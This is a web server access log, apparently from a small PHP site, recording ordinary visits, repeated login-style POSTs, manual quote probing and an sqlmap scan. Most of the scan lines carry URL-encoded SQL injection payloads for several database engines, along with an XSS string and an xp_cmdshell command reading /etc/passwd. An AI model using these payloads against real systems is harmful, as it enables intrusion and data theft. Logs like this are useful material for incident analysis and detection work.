88.124.221.38 - - [22/Apr/2020:13:46:25 +0000] "POST /index.php HTTP/1.1" 200 627 "http://54.38.232.200:30085/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.113 Safari/537.36"
31.38.33.116 - - [22/Apr/2020:13:46:35 +0000] "POST /index.php HTTP/1.1" 200 627 "http://54.38.232.200:30085/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.113 Safari/537.36"
89.158.250.112 - - [22/Apr/2020:13:46:44 +0000] "GET / HTTP/1.1" 200 618 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
31.38.33.116 - - [22/Apr/2020:13:46:54 +0000] "POST /index.php HTTP/1.1" 200 627 "http://54.38.232.200:30085/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.113 Safari/537.36"
81.50.150.118 - - [22/Apr/2020:13:47:07 +0000] "POST /index.php HTTP/1.1" 200 627 "http://54.38.232.200:30085/index.php" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.113 Safari/537.36"
89.158.250.112 - - [22/Apr/2020:13:47:29 +0000] "GET / HTTP/1.1" 200 676 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
89.158.250.112 - - [22/Apr/2020:13:47:29 +0000] "GET /favicon.ico HTTP/1.1" 404 494 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
89.158.250.112 - - [22/Apr/2020:13:47:47 +0000] "GET / HTTP/1.1" 200 618 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
88.124.221.38 - - [22/Apr/2020:13:48:13 +0000] "POST /index.php HTTP/1.1" 200 627 "http://54.38.232.200:30085/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.113 Safari/537.36"
88.124.221.38 - - [22/Apr/2020:13:48:18 +0000] "POST /index.php HTTP/1.1" 200 626 "http://54.38.232.200:30085/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.113 Safari/537.36"
88.124.221.38 - - [22/Apr/2020:13:48:33 +0000] "POST /index.php HTTP/1.1" 200 627 "http://54.38.232.200:30085/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.113 Safari/537.36"
88.124.221.38 - - [22/Apr/2020:13:48:54 +0000] "POST /index.php HTTP/1.1" 200 627 "http://54.38.232.200:30085/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.113 Safari/537.36"
31.38.33.116 - - [22/Apr/2020:13:49:08 +0000] "POST /index.php HTTP/1.1" 200 627 "http://54.38.232.200:30085/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.113 Safari/537.36"
88.124.221.38 - - [22/Apr/2020:13:49:47 +0000] "POST /index.php HTTP/1.1" 200 627 "http://54.38.232.200:30085/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.113 Safari/537.36"
88.124.221.38 - - [22/Apr/2020:13:49:51 +0000] "POST /index.php HTTP/1.1" 200 626 "http://54.38.232.200:30085/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.113 Safari/537.36"
88.124.221.38 - - [22/Apr/2020:13:49:58 +0000] "POST /index.php HTTP/1.1" 200 627 "http://54.38.232.200:30085/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.113 Safari/537.36"
88.124.221.38 - - [22/Apr/2020:13:50:00 +0000] "POST /index.php HTTP/1.1" 200 626 "http://54.38.232.200:30085/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.113 Safari/537.36"
88.124.221.38 - - [22/Apr/2020:13:50:07 +0000] "POST /index.php HTTP/1.1" 200 627 "http://54.38.232.200:30085/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.113 Safari/537.36"
88.124.221.38 - - [22/Apr/2020:13:50:10 +0000] "POST /index.php HTTP/1.1" 200 626 "http://54.38.232.200:30085/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.113 Safari/537.36"
31.38.33.116 - - [22/Apr/2020:13:50:10 +0000] "POST /index.php HTTP/1.1" 200 627 "http://54.38.232.200:30085/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.113 Safari/537.36"
86.210.204.197 - - [22/Apr/2020:13:51:07 +0000] "POST /index.php HTTP/1.1" 200 676 "-" "python-requests/2.23.0"
88.124.221.38 - - [22/Apr/2020:13:51:55 +0000] "POST /index.php HTTP/1.1" 200 627 "http://54.38.232.200:30085/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.113 Safari/537.36"
37.166.187.109 - - [22/Apr/2020:13:53:33 +0000] "GET / HTTP/1.1" 200 639 "-" "sqlmap/1.4.4#stable (http://sqlmap.org)"
37.166.187.109 - - [22/Apr/2020:13:53:37 +0000] "GET /?SNfh=2549%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23 HTTP/1.1" 200 581 "-" "sqlmap/1.4.4#stable (http://sqlmap.org)"
37.166.187.109 - - [22/Apr/2020:13:53:38 +0000] "GET / HTTP/1.1" 200 581 "-" "sqlmap/1.4.4#stable (http://sqlmap.org)"
88.124.221.38 - - [22/Apr/2020:13:53:54 +0000] "GET /index.php?id=1 HTTP/1.1" 200 618 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.113 Safari/537.36"
88.124.221.38 - - [22/Apr/2020:13:54:04 +0000] "GET /index.php?id=1%27 HTTP/1.1" 200 618 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.113 Safari/537.36"
88.124.221.38 - - [22/Apr/2020:13:54:34 +0000] "GET /index.php?id=1%27 HTTP/1.1" 200 618 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.113 Safari/537.36"
88.124.221.38 - - [22/Apr/2020:13:54:48 +0000] "POST /index.php HTTP/1.1" 200 627 "http://54.38.232.200:30085/index.php?id=1%27" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.113 Safari/537.36"
83.198.2.131 - - [22/Apr/2020:13:54:50 +0000] "GET / HTTP/1.1" 200 676 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0"
83.198.2.131 - - [22/Apr/2020:13:54:50 +0000] "GET /favicon.ico HTTP/1.1" 404 494 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0"
31.38.33.116 - - [22/Apr/2020:13:54:52 +0000] "POST /index.php HTTP/1.1" 200 627 "http://54.38.232.200:30085/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.113 Safari/537.36"
31.38.33.116 - - [22/Apr/2020:13:54:52 +0000] "POST /index.php HTTP/1.1" 200 626 "http://54.38.232.200:30085/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.113 Safari/537.36"
31.38.33.116 - - [22/Apr/2020:13:54:53 +0000] "POST /index.php HTTP/1.1" 200 626 "http://54.38.232.200:30085/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.113 Safari/537.36"
31.38.33.116 - - [22/Apr/2020:13:54:54 +0000] "POST /index.php HTTP/1.1" 200 626 "http://54.38.232.200:30085/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.113 Safari/537.36"
31.38.33.116 - - [22/Apr/2020:13:54:56 +0000] "POST /index.php HTTP/1.1" 200 626 "http://54.38.232.200:30085/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.113 Safari/537.36"
31.38.33.116 - - [22/Apr/2020:13:54:56 +0000] "POST /index.php HTTP/1.1" 200 626 "http://54.38.232.200:30085/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.113 Safari/537.36"
31.38.33.116 - - [22/Apr/2020:13:54:57 +0000] "POST /index.php HTTP/1.1" 200 626 "http://54.38.232.200:30085/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.113 Safari/537.36"
37.166.187.109 - - [22/Apr/2020:13:55:00 +0000] "GET /index.php HTTP/1.1" 200 639 "-" "sqlmap/1.4.4#stable (http://sqlmap.org)"
83.198.2.131 - - [22/Apr/2020:13:55:02 +0000] "GET /index.php HTTP/1.1" 200 618 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0"
31.38.33.116 - - [22/Apr/2020:13:55:03 +0000] "POST /index.php HTTP/1.1" 200 627 "http://54.38.232.200:30085/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.113 Safari/537.36"
37.166.187.109 - - [22/Apr/2020:13:55:03 +0000] "GET /index.php?PULe=7965%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23 HTTP/1.1" 200 581 "-" "sqlmap/1.4.4#stable (http://sqlmap.org)"
37.166.187.109 - - [22/Apr/2020:13:55:03 +0000] "GET /index.php HTTP/1.1" 200 581 "-" "sqlmap/1.4.4#stable (http://sqlmap.org)"
31.38.33.116 - - [22/Apr/2020:13:55:03 +0000] "POST /index.php HTTP/1.1" 200 626 "http://54.38.232.200:30085/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.113 Safari/537.36"
31.38.33.116 - - [22/Apr/2020:13:55:03 +0000] "POST /index.php HTTP/1.1" 200 626 "http://54.38.232.200:30085/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.113 Safari/537.36"
31.38.33.116 - - [22/Apr/2020:13:55:03 +0000] "POST /index.php HTTP/1.1" 200 626 "http://54.38.232.200:30085/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.113 Safari/537.36"
31.38.33.116 - - [22/Apr/2020:13:55:04 +0000] "POST /index.php HTTP/1.1" 200 626 "http://54.38.232.200:30085/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.113 Safari/537.36"
31.38.33.116 - - [22/Apr/2020:13:55:04 +0000] "POST /index.php HTTP/1.1" 200 626 "http://54.38.232.200:30085/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.113 Safari/537.36"
31.38.33.116 - - [22/Apr/2020:13:55:04 +0000] "POST /index.php HTTP/1.1" 200 626 "http://54.38.232.200:30085/index.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.113 Safari/537.36"
83.198.2.131 - - [22/Apr/2020:13:55:11 +0000] "GET /header.php HTTP/1.1" 404 495 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0"
83.198.2.131 - - [22/Apr/2020:13:55:17 +0000] "POST /index.php HTTP/1.1" 200 627 "http://54.38.232.200:30085/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0"
83.198.2.131 - - [22/Apr/2020:13:55:19 +0000] "POST /index.php HTTP/1.1" 200 626 "http://54.38.232.200:30085/index.php" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0"
83.198.2.131 - - [22/Apr/2020:13:55:19 +0000] "POST /index.php HTTP/1.1" 200 626 "http://54.38.232.200:30085/index.php" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0"
83.198.2.131 - - [22/Apr/2020:13:55:20 +0000] "POST /index.php HTTP/1.1" 200 626 "http://54.38.232.200:30085/index.php" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0"
83.198.2.131 - - [22/Apr/2020:13:55:23 +0000] "POST /index.php HTTP/1.1" 200 626 "http://54.38.232.200:30085/index.php" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0"
83.198.2.131 - - [22/Apr/2020:13:55:29 +0000] "POST /index.php HTTP/1.1" 200 627 "http://54.38.232.200:30085/index.php" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0"
83.198.2.131 - - [22/Apr/2020:13:55:30 +0000] "POST /index.php HTTP/1.1" 200 626 "http://54.38.232.200:30085/index.php" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0"
37.166.187.109 - - [22/Apr/2020:13:55:38 +0000] "GET /index.php?page= HTTP/1.1" 200 639 "-" "sqlmap/1.4.4#stable (http://sqlmap.org)"
83.198.2.131 - - [22/Apr/2020:13:55:39 +0000] "GET /robots.txt HTTP/1.1" 404 495 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0"
37.166.187.109 - - [22/Apr/2020:13:55:40 +0000] "GET /index.php?page= HTTP/1.1" 200 581 "-" "sqlmap/1.4.4#stable (http://sqlmap.org)"
37.166.187.109 - - [22/Apr/2020:13:55:40 +0000] "GET /index.php?page=8205 HTTP/1.1" 200 581 "-" "sqlmap/1.4.4#stable (http://sqlmap.org)"
37.166.187.109 - - [22/Apr/2020:13:55:40 +0000] "GET /index.php?page=%29%22%29.%27%2C%28.%28%2C HTTP/1.1" 200 581 "-" "sqlmap/1.4.4#stable (http://sqlmap.org)"
37.166.187.109 - - [22/Apr/2020:13:55:40 +0000] "GET /index.php?page=%27VRBgaC%3C%27%22%3EJbZAEX HTTP/1.1" 200 581 "-" "sqlmap/1.4.4#stable (http://sqlmap.org)"
37.166.187.109 - - [22/Apr/2020:13:55:40 +0000] "GET /index.php?page=%29%20AND%201285%3D7483%20AND%20%283646%3D3646 HTTP/1.1" 200 581 "-" "sqlmap/1.4.4#stable (http://sqlmap.org)"
37.166.187.109 - - [22/Apr/2020:13:55:40 +0000] "GET /index.php?page=%20AND%205345%3D9089 HTTP/1.1" 200 581 "-" "sqlmap/1.4.4#stable (http://sqlmap.org)"
37.166.187.109 - - [22/Apr/2020:13:55:40 +0000] "GET /index.php?page=%27%29%20AND%206509%3D5902%20AND%20%28%27VhpM%27%3D%27VhpM HTTP/1.1" 200 581 "-" "sqlmap/1.4.4#stable (http://sqlmap.org)"
37.166.187.109 - - [22/Apr/2020:13:55:40 +0000] "GET /index.php?page=%27%20AND%204812%3D1086%20AND%20%27NLGq%27%3D%27NLGq HTTP/1.1" 200 581 "-" "sqlmap/1.4.4#stable (http://sqlmap.org)"
37.166.187.109 - - [22/Apr/2020:13:55:40 +0000] "GET /index.php?page=%20AND%205303%3D9446--%20yRpj HTTP/1.1" 200 581 "-" "sqlmap/1.4.4#stable (http://sqlmap.org)"
37.166.187.109 - - [22/Apr/2020:13:55:40 +0000] "GET /index.php?page=%28SELECT%20%28CASE%20WHEN%20%285383%3D8092%29%20THEN%20%27%27%20ELSE%20%28SELECT%208092%20UNION%20SELECT%201853%29%20END%29%29 HTTP/1.1" 200 581 "-" "sqlmap/1.4.4#stable (http://sqlmap.org)"
37.166.187.109 - - [22/Apr/2020:13:55:40 +0000] "GET /index.php?page=%29%20AND%20%28SELECT%203453%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7171626a71%2C%28SELECT%20%28ELT%283453%3D3453%2C1%29%29%29%2C0x7170626b71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29%20AND%20%284834%3D4834 HTTP/1.1" 200 581 "-" "sqlmap/1.4.4#stable (http://sqlmap.org)"
37.166.187.109 - - [22/Apr/2020:13:55:41 +0000] "GET /index.php?page=%20AND%20%28SELECT%203453%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7171626a71%2C%28SELECT%20%28ELT%283453%3D3453%2C1%29%29%29%2C0x7170626b71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29 HTTP/1.1" 200 581 "-" "sqlmap/1.4.4#stable (http://sqlmap.org)"
37.166.187.109 - - [22/Apr/2020:13:55:41 +0000] "GET /index.php?page=%27%29%20AND%20%28SELECT%203453%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7171626a71%2C%28SELECT%20%28ELT%283453%3D3453%2C1%29%29%29%2C0x7170626b71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29%20AND%20%28%27zqEg%27%3D%27zqEg HTTP/1.1" 200 581 "-" "sqlmap/1.4.4#stable (http://sqlmap.org)"
37.166.187.109 - - [22/Apr/2020:13:55:41 +0000] "GET /index.php?page=%27%20AND%20%28SELECT%203453%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7171626a71%2C%28SELECT%20%28ELT%283453%3D3453%2C1%29%29%29%2C0x7170626b71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29%20AND%20%27ISJZ%27%3D%27ISJZ HTTP/1.1" 200 581 "-" "sqlmap/1.4.4#stable (http://sqlmap.org)"
37.166.187.109 - - [22/Apr/2020:13:55:41 +0000] "GET /index.php?page=%20AND%20%28SELECT%203453%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7171626a71%2C%28SELECT%20%28ELT%283453%3D3453%2C1%29%29%29%2C0x7170626b71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29--%20vokg HTTP/1.1" 200 581 "-" "sqlmap/1.4.4#stable (http://sqlmap.org)"
37.166.187.109 - - [22/Apr/2020:13:55:41 +0000] "GET /index.php?page=%29%20AND%203417%3DCAST%28%28CHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%283417%3D3417%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%2898%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%20AND%20%288199%3D8199 HTTP/1.1" 200 581 "-" "sqlmap/1.4.4#stable (http://sqlmap.org)"
37.166.187.109 - - [22/Apr/2020:13:55:41 +0000] "GET /index.php?page=%20AND%203417%3DCAST%28%28CHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%283417%3D3417%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%2898%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29 HTTP/1.1" 200 581 "-" "sqlmap/1.4.4#stable (http://sqlmap.org)"
37.166.187.109 - - [22/Apr/2020:13:55:41 +0000] "GET /index.php?page=%27%29%20AND%203417%3DCAST%28%28CHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%283417%3D3417%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%2898%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%20AND%20%28%27sJCP%27%3D%27sJCP HTTP/1.1" 200 581 "-" "sqlmap/1.4.4#stable (http://sqlmap.org)"
37.166.187.109 - - [22/Apr/2020:13:55:41 +0000] "GET /index.php?page=%27%20AND%203417%3DCAST%28%28CHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%283417%3D3417%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%2898%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%20AND%20%27INGb%27%3D%27INGb HTTP/1.1" 200 581 "-" "sqlmap/1.4.4#stable (http://sqlmap.org)"
37.166.187.109 - - [22/Apr/2020:13:55:41 +0000] "GET /index.php?page=%20AND%203417%3DCAST%28%28CHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%283417%3D3417%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%2898%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29--%20OpJh HTTP/1.1" 200 581 "-" "sqlmap/1.4.4#stable (http://sqlmap.org)"
37.166.187.109 - - [22/Apr/2020:13:55:41 +0000] "GET /index.php?page=%29%20AND%201730%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28113%29%2BCHAR%2898%29%2BCHAR%28106%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%281730%3D1730%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%2898%29%2BCHAR%28107%29%2BCHAR%28113%29%29%29%20AND%20%282381%3D2381 HTTP/1.1" 200 581 "-" "sqlmap/1.4.4#stable (http://sqlmap.org)"
37.166.187.109 - - [22/Apr/2020:13:55:41 +0000] "GET /index.php?page=%20AND%201730%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28113%29%2BCHAR%2898%29%2BCHAR%28106%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%281730%3D1730%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%2898%29%2BCHAR%28107%29%2BCHAR%28113%29%29%29 HTTP/1.1" 200 581 "-" "sqlmap/1.4.4#stable (http://sqlmap.org)"
37.166.187.109 - - [22/Apr/2020:13:55:41 +0000] "GET /index.php?page=%27%29%20AND%201730%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28113%29%2BCHAR%2898%29%2BCHAR%28106%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%281730%3D1730%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%2898%29%2BCHAR%28107%29%2BCHAR%28113%29%29%29%20AND%20%28%27TRSz%27%3D%27TRSz HTTP/1.1" 200 581 "-" "sqlmap/1.4.4#stable (http://sqlmap.org)"
37.166.187.109 - - [22/Apr/2020:13:55:42 +0000] "GET /index.php?page=%27%20AND%201730%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28113%29%2BCHAR%2898%29%2BCHAR%28106%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%281730%3D1730%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%2898%29%2BCHAR%28107%29%2BCHAR%28113%29%29%29%20AND%20%27GuUL%27%3D%27GuUL HTTP/1.1" 200 581 "-" "sqlmap/1.4.4#stable (http://sqlmap.org)"
37.166.187.109 - - [22/Apr/2020:13:55:42 +0000] "GET /index.php?page=%20AND%201730%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28113%29%2BCHAR%2898%29%2BCHAR%28106%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%281730%3D1730%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%2898%29%2BCHAR%28107%29%2BCHAR%28113%29%29%29--%20OPWn HTTP/1.1" 200 581 "-" "sqlmap/1.4.4#stable (http://sqlmap.org)"
37.166.187.109 - - [22/Apr/2020:13:55:42 +0000] "GET /index.php?page=%29%20AND%202319%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%282319%3D2319%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%2898%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%283277%3D3277 HTTP/1.1" 200 581 "-" "sqlmap/1.4.4#stable (http://sqlmap.org)"
37.166.187.109 - - [22/Apr/2020:13:55:42 +0000] "GET /index.php?page=%20AND%202319%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%282319%3D2319%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%2898%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29 HTTP/1.1" 200 581 "-" "sqlmap/1.4.4#stable (http://sqlmap.org)"
37.166.187.109 - - [22/Apr/2020:13:55:42 +0000] "GET /index.php?page=%27%29%20AND%202319%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%282319%3D2319%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%2898%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%28%27kEhM%27%3D%27kEhM HTTP/1.1" 200 581 "-" "sqlmap/1.4.4#stable (http://sqlmap.org)"
